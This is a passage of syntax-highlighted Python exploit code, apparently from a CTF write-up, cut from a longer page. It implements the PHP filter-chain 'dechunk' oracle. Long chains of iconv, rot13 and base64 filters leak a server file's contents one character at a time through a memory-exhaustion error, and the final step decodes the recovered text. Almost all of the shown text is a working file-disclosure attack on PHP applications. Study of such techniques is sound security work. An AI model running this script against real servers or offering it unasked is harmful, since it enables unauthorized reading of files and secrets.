class="hljs-number">2</span><br><span class="hljs-keyword">if</span> chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>: o.append(r4)<br>o.extend([flip, r4] * (chunk // <span class="hljs-number">2</span>))<br><span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) ^ (chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): o.append(r2)<br><span class="hljs-keyword">return</span> join(*o)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 3:</span><br><span class="hljs-string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span><br><span class="hljs-string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span><br><span class="hljs-string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span><br><span class="hljs-string">I just bruteforced every combination of iconv filters to find these.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span><br><span class="hljs-string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span><br><span class="hljs-string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span><br><span class="hljs-string">string to figure out which number it is.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>rot1 = <span class="hljs-string">&#x27;convert.iconv.437.CP930&#x27;</span><br>be = <span class="hljs-string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span><br>o = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_letter</span>(<span class="hljs-params">prefix</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-f A-F 0-9</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-e</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;edcba&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># A-E</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;EDCBA&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># f</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;f&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># F</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;F&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-s N-S</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-r</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rqpon&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># N-R</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;RQPON&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># s</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># S</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;S&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># i j k</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;k&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;j&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;i&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># I J K</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;J&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;I&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># v w x</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;x&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;w&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;v&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># V W X</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;X&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;W&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;V&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># M</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;M&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># m</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;m&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># l</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;l&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># L</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;L&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># h</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;h&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># H</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;H&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># u</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;u&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># U</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;U&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># g</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;g&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># G</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;G&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># t</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;t&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># T</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;T&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>&#x27;</span><br>letter = find_letter(prefix)<br><span class="hljs-comment"># it&#x27;s a number! check base64</span><br><span class="hljs-keyword">if</span> letter == <span class="hljs-string">&#x27;*&#x27;</span>:<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span><br>s = find_letter(prefix)<br><span class="hljs-keyword">if</span> s == <span class="hljs-string">&#x27;M&#x27;</span>:<br><span class="hljs-comment"># 0 - 3</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;N&#x27;</span>:<br><span class="hljs-comment"># 4 - 7</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;4&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;5&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;6&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;7&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;O&#x27;</span>:<br><span class="hljs-comment"># 8 - 9</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;8&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;9&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;wtf&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(end=letter)<br>o += letter<br>sys.stdout.flush()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">We are done!! :)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>()<br>d = b64decode(o.encode() + <span class="hljs-string">b&#x27;=&#x27;</span> * <span class="hljs-number">4</span>)<br><span class="hljs-comment"># remove KR padding</span><br>d = d.replace(<span class="hljs-string">b&#x27;$)C&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(b64decode(d))<br></code></pre></td></tr></table></figure><h2 